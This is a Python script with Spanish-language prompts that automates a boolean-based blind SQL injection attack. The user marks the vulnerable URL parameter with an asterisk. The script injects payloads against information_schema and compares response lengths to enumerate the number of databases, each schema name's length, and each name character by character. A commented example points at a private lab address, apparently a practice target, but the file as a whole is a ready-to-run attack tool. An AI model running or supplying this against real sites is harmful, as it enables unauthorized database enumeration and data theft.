import requests
import curses


def sacarNumTablas(url):
    #print("sacar num bases de datos")
    indice = url.find("*")
    payload = "'+or+(select+count(schema_name)+from+information_schema.schemata)%3d@+--+-+"
    if indice == -1:
        print("No se encontro el asterisco (*) en la cadena base.")
        return 0
    
    try:
        respuesta = requests.get(url)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        #print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")
    
    urlTrucado = url.replace("*", payload)
    #print(urlTrucado)
    numeroABuscar=int(input("Introduzca el numero de busquedas de bases de datos: "))
    
    for i in range (numeroABuscar):
        num = str(i)
        urlBuscado = urlTrucado.replace("@", num)
        #print(urlBuscado)
        try:
            respuesta = requests.get(urlBuscado)
            respuesta.raise_for_status()
            Longitud=len(respuesta.content)
            #print(Longitud)
            if(LongitudDeError != Longitud):
               print(f"El numero de la base de datos es: {i}")
               print("------------------------------------------------------")
               return i
        except requests.exceptions.HTTPError:
            print(f"Error al obtener la pagina web: {url}")

    return 0


#####################################################################################################

def SacarLargoNombre(numBase, url, numeroABuscarLargoNombre):
    #print("sacar nombre")
    payload = "'+or+(select+length(schema_name)+from+information_schema.schemata+limit+^,1)=@+--+-+"
    payloadPersonalizado = payload.replace("^", str(numBase))
    
    try:
        respuesta = requests.get(url)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        #print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")
    
    urlTrucado = url.replace("*", payloadPersonalizado)
    #print(urlTrucado)
    #numeroABuscarLargoNombre=int(input("Introduzca el numero de largo del nombre: "))
    for i in range (numeroABuscarLargoNombre):
        num = str(i)
        urlBuscado = urlTrucado.replace("@", num)
        #print(urlBuscado)
        try:
            respuesta = requests.get(urlBuscado)
            respuesta.raise_for_status()
            Longitud=len(respuesta.content)
            #print(LongitudDeError)
            if(Longitud != LongitudDeError):
               print(f"El nombre de la tabla contiene este numero de letras: {i}")
               print("------------------------------------------------------")
               return i
        except requests.exceptions.HTTPError:
            print(f"Error al obtener la pagina web: {url}")
    return 1


##################################################################################################### POR TERMINAR

def sacarNombre(longitudNombreTabla, url, numTabla):
    #print("Sacar nombre")
    try:
        respuesta = requests.get(url)
        respuesta.raise_for_status()
        LongitudDeError=len(respuesta.content)
        #print(LongitudDeError)
    except requests.exceptions.HTTPError:
        print(f"Error al obtener la pagina web: {url}")

    payload = "'+or+substring((select+schema_name+from+information_schema.schemata+limit+^,1),@,1)='/'+--+-+"
    payloadPers = payload.replace("^" ,str(numTabla))
    nombreTabla = ""
    for i in range (longitudNombreTabla):
        payloadPersNum= payloadPers.replace("@", str(i+1))
        for j in range (95, 128):
            #print(j)
            payloadPersNumLetra = payloadPersNum.replace("/", chr(j))
            urlBuscado = url.replace("*", payloadPersNumLetra)
            #print(urlBuscado)
            try:
                respuesta = requests.get(urlBuscado)
                respuesta.raise_for_status()
                Longitud=len(respuesta.content)
                #print(Longitud)
                if(Longitud != LongitudDeError):
                    nombreTabla+=chr(j)
                    print(nombreTabla)
            except requests.exceptions.HTTPError:
                print(f"Error al obtener la pagina web: {url}")

    print(f"El nombre de la tabla es: {nombreTabla}")
    print("------------------------------------------------------")




#####################################################################################################
#print("Hola mundo")
url=(input("Introduzca la URL, con un asterisco en el parametro vulnerable: "))
#"http://10.0.2.21/sqli/example1.php?name=*HTTP/1.1"
numeroBaseDeDatos=sacarNumTablas(url)
if(numeroBaseDeDatos !=0):
    for i in range(numeroBaseDeDatos):
        numeroABuscarLargoNombre=1
        longitudNombreTabla=1
        while(longitudNombreTabla == 1 ):
            numeroABuscarLargoNombre+=1
            #numeroABuscarLargoNombre=int(input("Introduzca el numero de largo del nombre: "))
            longitudNombreTabla = SacarLargoNombre(i, url, numeroABuscarLargoNombre)
        sacarNombre(longitudNombreTabla, url, i)
else:
    print("No se pudo sacar el numero de bases de datos, revisa el URL proporcionado")




